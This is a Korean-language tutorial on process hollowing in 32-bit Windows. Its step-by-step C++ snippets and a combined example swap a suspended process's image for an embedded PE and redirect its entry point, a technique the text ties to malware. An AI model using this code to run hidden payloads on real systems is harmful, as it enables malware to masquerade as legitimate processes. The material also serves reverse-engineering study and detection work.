### 1. CREATE_SUSPENDED로 CreateProcessA 호출

- CreateProcessA 정의
    
    ```C++
    BOOL CreateProcessA(
      [in, optional]      LPCSTR                lpApplicationName,
      [in, out, optional] LPSTR                 lpCommandLine,
      [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
      [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
      [in]                BOOL                  bInheritHandles,
      [in]                DWORD                 dwCreationFlags,
      [in, optional]      LPVOID                lpEnvironment,
      [in, optional]      LPCSTR                lpCurrentDirectory,
      [in]                LPSTARTUPINFOA        lpStartupInfo,
      [out]               LPPROCESS_INFORMATION lpProcessInformation
    );
    ```
    

- dwCreationFlags로 CREATE_SUSPENDED (0x4)플래그를 사용하여 SUSPEND 상태의 Process를 생성
    
    ```C++
    CreateProcessA(
    		pFileName, pCmdLine, NULL , NULL, false,
    		CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcInfo
    );
    ```
    
- 해당 프로세스는 ResumeThread가 호출되기 전까지 실행되지 않음

### 2. NtUnmapViewofSection을 사용해 기존 Image를 Unmap

- GetThreadContext 정의
    
    ```C++
    BOOL GetThreadContext(
      [in]      HANDLE    hThread,
      [in, out] LPCONTEXT lpContext
    );
    ```
    

- GetThreadContext를 사용하여 현재 SUSPEND 상태인 Process의 ImageBase를 알아낼 수 있음
    
    - Context의 Ebx 맴버가 가리키는 주소의 +0x8 위치에 ImageBase 값이 존재
    
    ```C++
    GetThreadContext(ProcInfo.hThread,&Context);
    ```
    

- ReadProcessMemory 정의
    
    ```C++
    BOOL ReadProcessMemory(
      [in]  HANDLE  hProcess,
      [in]  LPCVOID lpBaseAddress,
      [out] LPVOID  lpBuffer,
      [in]  SIZE_T  nSize,
      [out] SIZE_T  *lpNumberOfBytesRead
    );
    ```
    
- CONTEXT 정의 - winnt.h
    
    ```C++
    typedef struct _CONTEXT {
    	DWORD ContextFlags;
        DWORD   Dr0;
        DWORD   Dr1;
        DWORD   Dr2;
        DWORD   Dr3;
        DWORD   Dr6;
        DWORD   Dr7;
        FLOATING_SAVE_AREA FloatSave;
        DWORD   SegGs;
        DWORD   SegFs;
        DWORD   SegEs;
        DWORD   SegDs;
        DWORD   Edi;
        DWORD   Esi;
        DWORD   Ebx;
        DWORD   Edx;
        DWORD   Ecx;
        DWORD   Eax;
        DWORD   Ebp;
        DWORD   Eip;
        DWORD   SegCs;              // MUST BE SANITIZED
        DWORD   EFlags;             // MUST BE SANITIZED
        DWORD   Esp;
        DWORD   SegSs;
        BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];
    } CONTEXT;
    ```
    

- ReadProcessMemory를 사용하여 기존 ImageBase 값을 확인 가능
    
    ```C++
    ReadProcessMemory(ProcInfo.hProcess, (Context.Ebx + 0x8), &ImageBase, 0x4, NULL);
    ```
    

- NtUnmapViewofSection 정의
    
    ```C++
    NTSYSAPI NTSTATUS ZwUnmapViewOfSection(
      [in]           HANDLE ProcessHandle,
      [in, optional] PVOID  BaseAddress
    );
    ```
    

- NtUnmapViewofSection을 사용하여 기존 ImageBase를 Unmap
    
    ```C++
    NtUnmapViewofSection(ProcInfo.hProcess, ImageBase);
    ```
    

### 3. VirtualMemory를 할당 받고 새 Image를 배치

- 일반적으로 악성 코드는 내부에 교체하기 위한 PE 파일 데이터를 포함하고 있음
- 해당 파일 데이터를 실행하기 위해서는 메모리 상에서 재배치가 필요함
- PE Header를 복사하고, Section Header 정보에 맞춰 Section을 재배치

- VirtualAllocEx 정의
    
    ```C++
    LPVOID VirtualAllocEx(
      [in]           HANDLE hProcess,
      [in, optional] LPVOID lpAddress,
      [in]           SIZE_T dwSize,
      [in]           DWORD  flAllocationType,
      [in]           DWORD  flProtect
    );
    ```
    

- 새 ImageBase와 SizeOfImage를 VirtualAllocEx로 전달하여 PE 재배치를 위한 VirtualMemory를 할당
    
    - 이 때, 새 PE 파일 내의 ImageBase와 SizeOfImage 정보를 활용
    
    ```C++
    pNTHeader = pNewImageFile + *(pNewImageFile + 0x3C)
    pVM = VirtualAllocEx(
    		ProcInfo.hProcess,(pNTHeader->OptionalHeader).ImageBase,
        (pNTHeader->OptionalHeader).SizeOfImage, MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
    ```
    

- NtWriteVirtualMemory 정의
    
    ```C++
    function NtWriteVirtualMemory(
      ProcessHandle: HANDLE;
      BaseAddress: PVOID;
      Buffer: PVOID;
      BufferLength: ULONG;
      ReturnLength: PULONG
    ):NTSTATUS;
    ```
    

- NtWriteVirtualMemory를 사용하여 PE Header를 할당 받은 VM에 복사
    
    - 이 때, 새 PE 파일 내의 SizeOfHeaders 정보를 활용
    
    ```C++
    NtWriteVirtualMemory(
    		ProcInfo.hProcess, pVM, pNewImageFile, (pNTHeader->OptionalHeader).SizeOfHeaders, 0x0
    );
    ```
    
- 반복문과 NtWriteVirtualMemory를 사용하여 각 Section을 할당 받은 VM에 복사
    
    - 이 때, 새 PE 파일 내의 Section Header 정보를 활용
    - NumberOfSections = 섹션의 수
    - VirtualAddress = 해당 섹션의 메모리 상의 RVA
    - PointerToRawData = 해당 섹션의 파일 상의 Offset
    - SizeOfRawData = 해당 섹션의 파일 상의 크기
    
    ```C++
    for (i = 0; i < (pNTHeader->FileHeader).NumberOfSections; i = i + 0x1) {
    		pSectionHeader = pNTHeader + 0xf8 + i * 0x28;
        NtWriteVirtualMemory(
    				ProcInfo.hProcess, pVM + pSectionHeader->VirtualAddress,
            pNewImageFile + pSectionHeader->PointerToRawData, pSectionHeader->SizeOfRawData, 0x0
    		);
    }
    ```
    

### 4. ThreadContext 내의 ImageBase와 EntryPoint를 변경

- WriteProcessMemory를 사용하여 새로 할당한 VM으로 SUSPEND 상태인 Process의 ImageBase를 교체
    
```C++
WriteProcessMemory(ProcInfo.hProcess, Context.Ebx + 0x8, 
                   &(pNTHeader->OptionalHeader).ImageBase, 0x4, 0x0);
```
    
- 또한 AddressOfEntryPoint 정보를 사용하여 EP 주소 또한 교체
    
    ```C++
    Context.Eax = pVM + (pNTHeader->OptionalHeader).AddressOfEntryPoint;
    ```
    

### 5. SetThreadContext와 ResumeThread를 호출

- SetThreadContext 정의
    
    ```C++
    BOOL SetThreadContext(
      [in] HANDLE        hThread,
      [in] const CONTEXT *lpContext
    );
    ```
    

- 새로운 정보를 설정한 Context를 SetThreadContext를 통해 Set
    
    ```C++
    SetThreadContext(ProcInfo.hThread,&Context);
    ```
    

- ResumeThread 정의
    
    ```C++
    DWORD ResumeThread(
      [in] HANDLE hThread
    );
    ```
    

- ResumeThread를 호출하여 Process를 실행
    
    ```C++
    ResumeThread(ProcInfo.hThread);
    ```
    

### 6. 예시 - Process Image 교체

```C++
// Create Suspended Process
CreateProcessA(
		pFileName, pCmdLine, NULL , NULL, false,
		CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcInfo
);

// Unmap Existing Process ImageBase
GetThreadContext(ProcInfo.hThread,&Context);
NtUnmapViewofSection(ProcInfo.hProcess, ImageBase);

// Alloc VM
pNTHeader = pNewImageFile + *(pNewImageFile + 0x3C)
pVM = VirtualAllocEx(
		ProcInfo.hProcess,(pNTHeader->OptionalHeader).ImageBase,
    (pNTHeader->OptionalHeader).SizeOfImage, MEM_RESERVE | MEM_COMMIT,
    PAGE_EXECUTE_READWRITE
);

// Write PE Header
NtWriteVirtualMemory(
		ProcInfo.hProcess, pVM, pNewImageFile, (pNTHeader->OptionalHeader).SizeOfHeaders, 0x0
);

// Write Section
for (i = 0; i < (pNTHeader->FileHeader).NumberOfSections; i = i + 0x1) {
		pSectionHeader = pNTHeader + 0xf8 + i * 0x28;
    NtWriteVirtualMemory(
				ProcInfo.hProcess, pVM + pSectionHeader->VirtualAddress,
        pNewImageFile + pSectionHeader->PointerToRawData, pSectionHeader->SizeOfRawData, 0x0
		);
}

// Change ImageBase, EP
WriteProcessMemory(
		ProcInfo.hProcess, Context.Ebx + 0x8, &(pNTHeader->OptionalHeader).ImageBase, 0x4, 0x0
);
Context.Eax = pVM + (pNTHeader->OptionalHeader).AddressOfEntryPoint;
SetThreadContext(ProcInfo.hThread,&Context);

// Start Process
ResumeThread(ProcInfo.hThread);
```